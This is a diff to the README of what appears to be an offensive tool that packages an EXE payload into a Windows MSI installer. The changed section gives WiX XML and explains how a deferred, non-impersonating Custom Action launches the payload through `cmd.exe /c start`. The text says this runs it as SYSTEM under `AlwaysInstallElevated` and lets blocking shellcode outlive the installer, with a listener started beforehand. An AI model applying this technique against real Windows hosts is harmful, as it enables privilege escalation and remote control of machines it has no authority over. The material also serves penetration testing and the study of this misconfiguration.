@@ -77,32 +77,40 @@ listener before you invoke `msiexec`.
 
 ## How it works (WiX)
 
-The generated `.wxs` embeds the EXE into the `Binary` table and schedules
-a single Custom Action after `InstallInitialize`:
+The generated `.wxs` installs the EXE as a regular `<File>` under
+`Program Files\<product_name>\`, then schedules a deferred Custom Action
+after `InstallFiles` that launches the EXE via `cmd.exe /c start`:
 
 ```xml
-<Binary Id="payload" SourceFile="..." />
+<Component Id="PayloadComp" Guid="...">
+    <File Id="payloadFile" Source="..." KeyPath="yes" />
+</Component>
 
 <CustomAction Id="RunPayload"
-              BinaryKey="payload"
-              ExeCommand=""
+              Directory="INSTALLDIR"
+              ExeCommand='cmd.exe /c start "" "[#payloadFile]"'
               Execute="deferred"
               Impersonate="no"
-              Return="asyncNoWait" />
+              Return="ignore" />
 
 <InstallExecuteSequence>
-    <Custom Action="RunPayload" After="InstallInitialize" />
+    <Custom Action="RunPayload" After="InstallFiles" />
 </InstallExecuteSequence>
 ```
 
 - `Execute="deferred"` — runs in the installer's server process.
 - `Impersonate="no"` — don't impersonate the installing user; run as the
   installer account. Under `AlwaysInstallElevated` that's SYSTEM.
-- `Return="asyncNoWait"` — don't block the installer on the payload,
-  avoids hanging `msiexec` if the shellcode blocks on a socket.
+- `cmd.exe /c start "" "..."` — `start` detaches the child process so
+  the payload outlives `cmd.exe` (and the installer). `cmd.exe` itself
+  returns immediately, so MSI doesn't hang on a blocking shellcode.
+- `Return="ignore"` — waits for `cmd.exe` (fast) and ignores its return
+  code.
 
-No files are written to disk by the installer itself — the payload is
-unpacked from the Binary table directly to a temp file and executed.
+> Why not `Return="asyncNoWait"`? Windows Installer does **not** allow
+> `asyncNoWait` on deferred custom actions — the engine silently skips
+> such CAs without recording them in the execution script. The
+> `cmd.exe /c start` trick is the standard workaround.
 
 ## Troubleshooting
 
